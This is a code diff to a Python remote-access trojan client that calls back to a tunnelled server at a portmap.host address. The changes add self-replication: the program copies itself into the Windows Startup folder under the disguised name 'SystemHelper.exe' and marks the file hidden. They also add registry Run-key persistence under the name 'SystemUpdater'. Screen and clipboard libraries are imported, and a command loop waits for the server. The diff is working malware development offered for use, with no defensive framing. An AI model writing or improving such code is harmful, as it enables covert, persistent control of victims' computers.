@@ -5,7 +5,9 @@ import os
 import shutil
 import pyautogui
 import pyperclip
-import platform 
+import platform
+import sys
+import ctypes
 
 SERVER_IP = "lachowski-57687.portmap.host" 
 PORT = 57687
@@ -19,28 +21,78 @@ def send_data(sock, data):
         pass
 
 # ============================================
-# PERSISTENCE FUNCTION (FIXED - OUTSIDE send_data)
+# SELF-REPLICATE TO PERMANENT LOCATION
+# ============================================
+def replicate_to_permanent_location():
+    """Copy the running executable to the Startup folder and hide it."""
+    try:
+        # Get the path of the currently running executable
+        if getattr(sys, 'frozen', False):
+            current_path = sys.executable
+        else:
+            current_path = os.path.abspath(__file__)
+
+        # Target: Startup folder (no admin required)
+        permanent_dir = os.path.join(
+            os.environ.get('APPDATA', ''),
+            'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'
+        )
+        filename = "SystemHelper.exe"
+        
+        os.makedirs(permanent_dir, exist_ok=True)
+        permanent_path = os.path.join(permanent_dir, filename)
+        
+        # Only copy if we're not already running from the Startup folder
+        if os.path.abspath(current_path) != os.path.abspath(permanent_path):
+            # Copy the file
+            shutil.copy2(current_path, permanent_path)
+            
+            # Hide the file in the Startup folder
+            try:
+                ctypes.windll.kernel32.SetFileAttributesW(permanent_path, 2)  # FILE_ATTRIBUTE_HIDDEN
+            except:
+                pass
+            
+            print(f"[+] Copied itself to: {permanent_path}")
+            return permanent_path
+        else:
+            print(f"[*] Already running from: {permanent_path}")
+            return current_path
+    except Exception as e:
+        print(f"[-] Self-replicate failed: {str(e)}")
+        return None
+
+# ============================================
+# PERSISTENCE FUNCTION (UPDATED)
 # ============================================
 def add_persistence():
-    """Add the client to Windows startup"""
+    """Add the PERMANENT copy of the client to Windows startup registry."""
     try:
         import winreg
+        
+        # Get the path of the file in the Startup folder
+        permanent_dir = os.path.join(
+            os.environ.get('APPDATA', ''),
+            'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'
+        )
+        filename = "SystemHelper.exe"
+        permanent_path = os.path.join(permanent_dir, filename)
+
+        # If the permanent file doesn't exist (shouldn't happen), use the current path
+        if not os.path.exists(permanent_path):
+            if getattr(sys, 'frozen', False):
+                permanent_path = sys.executable
+            else:
+                permanent_path = os.path.abspath(__file__)
+
         key = winreg.HKEY_CURRENT_USER
         subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
         key_handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
         
-        # Get the current executable path
-        # If running as .exe, use sys.executable; if .py, use __file__
-        import sys
-        if getattr(sys, 'frozen', False):
-            # Running as compiled .exe
-            exe_path = sys.executable
-        else:
-            # Running as .py script
-            exe_path = os.path.abspath(__file__)
-        
-        winreg.SetValueEx(key_handle, "SystemUpdater", 0, winreg.REG_SZ, exe_path)
+        # Add the registry entry pointing to the PERMANENT location
+        winreg.SetValueEx(key_handle, "SystemUpdater", 0, winreg.REG_SZ, permanent_path)
         winreg.CloseKey(key_handle)
+        print(f"[+] Persistence set to: {permanent_path}")
         return True
     except Exception as e:
         print(f"[-] Persistence failed: {str(e)}")
@@ -58,12 +110,16 @@ while True:
         time.sleep(5)
 
 # ============================================
-# ADD PERSISTENCE (NOW ACTUALLY CALLED)
+# RUN PERSISTENCE & SELF-REPLICATE (IN ORDER)
 # ============================================
+# 1. Copy itself to Startup folder
+replicate_to_permanent_location()
+
+# 2. Set Registry to point to the copied file
 add_persistence()
 
 # ============================================
-# MAIN COMMAND LOOP
+# MAIN COMMAND LOOP (Your existing code...)
 # ============================================
 while True:
     try:
